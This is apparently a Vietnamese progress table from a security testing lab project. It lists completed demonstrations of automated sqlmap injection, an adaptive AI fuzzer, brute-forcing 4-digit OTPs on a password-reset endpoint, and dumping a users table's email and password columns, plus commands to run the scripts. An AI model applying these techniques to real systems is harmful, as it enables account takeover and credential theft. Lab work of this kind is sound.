| **L1** | **A03** (Injection) | Tự động hóa sqlmap 3 kịch bản: Proxy check, Param scan, Raw request | `demo/sqlmap/run_sqlmap_demo.sh`<br>`demo/sqlmap/sqlmap-logs/scenario_{1,2,3}*.log` | **Hoàn tất 100%** |
| **L2** | **A03** (Injection) | Lập trình module AI Fuzzer thích ứng Mức 2 (Feedback loop) | `demo/ai_fuzzer/ai_fuzzer.py`<br>`demo/ai_fuzzer/benchmark_fuzzer.py` | **Hoàn tất 100%** |
| **L3** | **A03** (Injection) | Cơ chế Offline Playback & Cache kết quả thực nghiệm đối chứng | `demo/ai_fuzzer/fuzzer_cache.json`<br>`demo/ai_fuzzer/benchmark_results.json` | **Hoàn tất 100%** |
| **L4** | Tổng hợp | Báo cáo chuyên đề thực nghiệm kỹ thuật | `docs/bao-cao-thuc-nghiem-sqlmap-ai-fuzzer.md` | **Hoàn tất 100%** |
| **Bổ sung 1** | **A07** (Auth Failures) | Viết script Python tự động hóa vét cạn OTP 4 số vào `/api/reset-password` | `demo/brute_force_otp/brute_force_otp.py`<br>`demo/brute_force_otp/brute_force_otp.log` | **Hoàn tất 100%** |
| **Bổ sung 2** | **A02** (Crypto Failures) | Dùng sqlmap dump bảng `users` (`-C email,password`) chứng minh Plaintext | `demo/sqlmap/sqlmap-logs/sqlmap_dump_passwords.log` | **Hoàn tất 100%** |

Toàn bộ các tệp mã nguồn và log thực nghiệm được tổ chức rõ ràng, có khả năng tái lập 100% thông qua các tập lệnh thực nghiệm chuẩn hóa:
- **Tấn công vét cạn OTP (A07):** `python3 demo/brute_force_otp/brute_force_otp.py`
- **Kiểm chứng sqlmap và dump bảng users (A03 & A02):** `bash demo/sqlmap/run_sqlmap_demo.sh`
- **Thực nghiệm AI Fuzzer thích ứng (A03):** `python3 demo/ai_fuzzer/ai_fuzzer.py`

